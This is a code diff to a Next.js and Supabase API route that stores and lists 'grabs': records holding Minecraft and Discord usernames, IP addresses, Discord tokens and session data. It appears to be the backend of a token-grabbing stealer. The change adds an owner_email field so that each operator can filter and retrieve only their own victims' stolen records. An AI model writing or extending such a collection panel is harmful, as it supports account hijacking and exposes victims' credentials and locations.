@@ -11,12 +11,19 @@ function getClient() {
   );
 }
 
-export async function GET() {
+export async function GET(request) {
+  const { searchParams } = new URL(request.url);
+  const ownerEmail = searchParams.get('owner_email');
+
   const supabase = getClient();
-  const { data, error } = await supabase
-    .from('grabs')
-    .select('*')
-    .order('created_at', { ascending: false });
+
+  let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
+
+  if (ownerEmail) {
+    query = query.eq('owner_email', ownerEmail);
+  }
+
+  const { data, error } = await query;
 
   if (error) {
     return NextResponse.json({ grabs: [], error: error.message });
@@ -28,6 +35,7 @@ export async function POST(request) {
   const body = await request.json();
 
   const {
+    owner_email,
     minecraft_username,
     discord_username,
     ip_address,
@@ -40,7 +48,6 @@ export async function POST(request) {
     session_start,
     discord_token,
     servers,
-    timestamp,
   } = body;
 
   if (!minecraft_username) {
@@ -52,6 +59,7 @@ export async function POST(request) {
   const { data, error } = await supabase
     .from('grabs')
     .insert([{
+      owner_email: owner_email || '',
       minecraft_username: minecraft_username || 'Unknown',
       discord_username: discord_username || 'Unknown',
       ip_address: ip_address || 'Unknown',
